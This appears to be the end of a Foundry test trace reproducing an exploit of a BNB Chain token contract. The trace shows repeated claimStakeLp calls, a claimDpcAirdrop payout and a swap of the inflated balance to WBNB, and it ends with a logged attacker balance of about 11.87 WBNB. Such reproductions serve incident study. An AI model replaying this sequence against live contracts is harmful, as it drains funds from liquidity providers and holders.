    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [20354] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimStakeLp(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   ├─ [3303] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   └─ ← [Stop] 
    ├─ [40411] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::claimDpcAirdrop(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [439] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 29395643488880992621895 [2.939e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23]
    │   ├─ emit Transfer(from: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 279771103202807808000 [2.797e20])
    │   └─ ← [Stop] 
    ├─ [1959] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 286314488424845407278 [2.863e20]
    ├─ [278486] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(286314488424845407278 [2.863e20], 0, [0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, 0x55d398326f99059fF775485246999027B3197955, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662805963 [1.662e9])
    │   ├─ [192417] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x79cD24Ed4524373aF6e047556018b1440CF04be3, 286314488424845407278 [2.863e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 5726289768496908145 [5.726e18])
    │   │   ├─ [18109] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662834763 [1.662e9]) [delegatecall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000a
    │   │   ├─ [18109] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662834763 [1.662e9]) [delegatecall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000a
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE, value: 5726289768496908145 [5.726e18])
    │   │   ├─ [18109] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662834763 [1.662e9]) [delegatecall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000a
    │   │   ├─ [18109] 0xfF7A90FA8193b51482c37E84f3E9a0798921380b::getDay(1662834763 [1.662e9]) [delegatecall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000a
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2f72fe7CB8784E6b34a62C1E71c9DF4D8451be02, value: 2863144884248454072 [2.863e18])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, value: 271998764003603136914 [2.719e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039156889836955530831387 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [893] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::getReserves() [staticcall]
    │   │   └─ ← [Return] 107881728058171197363253 [1.078e23], 8242212301889392797719 [8.242e21], 1662719563 [1.662e9]
    │   ├─ [1959] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   └─ ← [Return] 8514211065892995934633 [8.514e21]
    │   ├─ [20673] 0x79cD24Ed4524373aF6e047556018b1440CF04be3::swap(3438096039293129465583 [3.438e21], 0, 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 0x)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 3438096039293129465583 [3.438e21])
    │   │   │   ├─ emit Transfer(from: 0x79cD24Ed4524373aF6e047556018b1440CF04be3, to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 3438096039293129465583 [3.438e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   │   └─ ← [Return] 104443632018878067897670 [1.044e23]
    │   │   ├─ [1959] 0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE::balanceOf(0x79cD24Ed4524373aF6e047556018b1440CF04be3) [staticcall]
    │   │   │   └─ ← [Return] 8514211065892995934633 [8.514e21]
    │   │   ├─ emit Sync(reserve0: 104443632018878067897670 [1.044e23], reserve1: 8514211065892995934633 [8.514e21])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 271998764003603136914 [2.719e20], amount0Out: 3438096039293129465583 [3.438e21], amount1Out: 0, to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE)
    │   │   └─ ← [Stop] 
    │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
    │   │   └─ ← [Return] 80654475585161717056074170 [8.065e25], 279160001838224320375056 [2.791e23], 1662719563 [1.662e9]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   └─ ← [Return] 80657913681201010185539753 [8.065e25]
    │   ├─ [48739] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(0, 11869629497407785960 [1.186e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11869629497407785960 [1.186e19])
    │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11869629497407785960 [1.186e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   │   └─ ← [Return] 80657913681201010185539753 [8.065e25]
    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   │   └─ ← [Return] 279148132208726912589096 [2.791e23]
    │   │   ├─ emit Sync(reserve0: 80657913681201010185539753 [8.065e25], reserve1: 279148132208726912589096 [2.791e23])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 3438096039293129465583 [3.438e21], amount1In: 0, amount0Out: 0, amount1Out: 11869629497407785960 [1.186e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 11869629497407785960 [1.186e19]
    │   └─ ← [Stop] 
    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 11869629497407785960 [1.186e19]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 11869629497407785960 [1.186e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.68s (4.07s CPU time)

Ran 2 test suites in 4.94s (4.93s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
